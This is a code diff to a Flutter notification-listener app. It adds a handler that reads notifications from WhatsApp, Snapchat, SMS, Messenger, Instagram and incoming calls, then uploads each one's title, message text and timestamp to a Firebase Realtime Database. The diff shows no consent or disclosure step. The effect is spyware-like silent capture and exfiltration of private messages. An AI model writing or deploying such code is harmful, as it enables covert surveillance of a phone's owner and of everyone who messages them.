@@ -1,11 +1,16 @@
 import 'dart:isolate';
 import 'dart:ui';
+import 'package:cloud_firestore/cloud_firestore.dart';
+import 'package:firebase_core/firebase_core.dart';
+import 'package:firebase_database/firebase_database.dart';
 import 'package:flutter/material.dart';
 import 'dart:async';
 import 'package:flutter_notification_listener/flutter_notification_listener.dart';
 
-void main() {
-  runApp(notification());
+void main() async {
+  WidgetsFlutterBinding.ensureInitialized();
+  await Firebase.initializeApp();
+  runApp(MaterialApp(home: notification()));
 }
 
 class notification extends StatefulWidget {
@@ -75,12 +80,116 @@ class _NotificationsLogState extends State<NotificationsLog> {
     });
   }
 
-  void onData(NotificationEvent event) {
+  onData(NotificationEvent event) async {
+    switch (event.packageName) {
+      case "com.whatsapp":
+        {
+          print("inside whatsapp loop");
+
+          try {
+            DatabaseReference ref =
+                FirebaseDatabase.instance.ref("/Dummy/Whatsapp");
+
+            await ref.push().set({
+              "Title": event.title,
+              "Content": event.text,
+              "Date": event.createAt.toString(),
+            });
+          } catch (e) {
+            print(e);
+          }
+        }
+      case "com.snapchat.android":
+        {
+          print("inside snapchat loop");
+
+          try {
+            DatabaseReference ref =
+                FirebaseDatabase.instance.ref("/Dummy/Snapchat");
+
+            await ref.push().set({
+              "Title": event.title,
+              "Content": event.text,
+              "Date": event.createAt.toString(),
+            });
+          } catch (e) {
+            print(e);
+          }
+        }
+      case "com.google.android.dialer":
+        {
+          if (event.text == "Incoming call") {
+            print("inside phone loop");
+
+            try {
+              DatabaseReference ref =
+                  FirebaseDatabase.instance.ref("/Dummy/Calls");
+
+              await ref.push().set({
+                "Title": event.title,
+                "Content": event.text,
+                "Date": event.createAt.toString(),
+              });
+            } catch (e) {
+              print(e);
+            }
+          }
+        }
+      case "com.google.android.apps.messaging":
+        {
+          print("inside SMS loop");
+
+          try {
+            DatabaseReference ref = FirebaseDatabase.instance.ref("/Dummy/SMS");
+
+            await ref.push().set({
+              "Title": event.title,
+              "Content": event.text,
+              "Date": event.createAt.toString(),
+            });
+          } catch (e) {
+            print(e);
+          }
+        }
+      case "com.facebook.orca":
+        {
+          print("inside Messenger loop");
+
+          try {
+            DatabaseReference ref =
+                FirebaseDatabase.instance.ref("/Dummy/Messenger");
+
+            await ref.push().set({
+              "Title": event.title,
+              "Content": event.text,
+              "Date": event.createAt.toString(),
+            });
+          } catch (e) {
+            print(e);
+          }
+        }
+      case "com.instagram.android":
+        {
+          print("inside Insta loop");
+
+          try {
+            DatabaseReference ref =
+                FirebaseDatabase.instance.ref("/Dummy/Instagram");
+
+            await ref.push().set({
+              "Title": event.title,
+              "Content": event.text,
+              "Date": event.createAt.toString(),
+            });
+          } catch (e) {
+            print(e);
+          }
+        }
+    }
+
     setState(() {
       _log.add(event);
     });
-
-    print(event.toString());
   }
 
   void startListening() async {
@@ -148,47 +257,13 @@ class _NotificationsLogState extends State<NotificationsLog> {
                     onTap: () {
                       entry.tap();
                     },
-                    // trailing:
-                    //     entry.hasLargeIcon ? Image.memory(entry.largeIcon, width: 80, height: 80) :
-                    //       Text(entry.packageName.toString().split('.').last),
                     title: Container(
                       child: Column(
                         crossAxisAlignment: CrossAxisAlignment.start,
                         children: [
                           Text(entry.title ?? "<<no title>>"),
+                          Text(entry.packageName ?? "<<no package>>"),
                           Text(entry.text ?? "<<no text>>"),
-                          Row(
-                            children: (entry.actions ?? []).map((act) {
-                              return TextButton(
-                                  onPressed: () {
-                                    // semantic is 1 means reply quick
-                                    if (act.semantic == 1) {
-                                      Map<String, dynamic> map = {};
-                                      (act.inputs ?? []).forEach((e) {
-                                        print(
-                                            "set inputs: ${e.label}<${e.resultKey}>");
-                                        map[e.resultKey ?? 'null'] =
-                                            "Auto reply from me";
-                                      });
-                                      act.postInputs(map);
-                                    } else {
-                                      // just tap
-                                      act.tap();
-                                    }
-                                  },
-                                  child: Text(act.title ?? ''));
-                            }).toList()
-                              ..add(TextButton(
-                                  child: Text("Full"),
-                                  onPressed: () async {
-                                    try {
-                                      var data = await entry.getFull();
-                                      print("full notifaction: $data");
-                                    } catch (e) {
-                                      print(e);
-                                    }
-                                  })),
-                          ),
                           Text(entry.createAt.toString().substring(0, 19)),
                         ],
                       ),
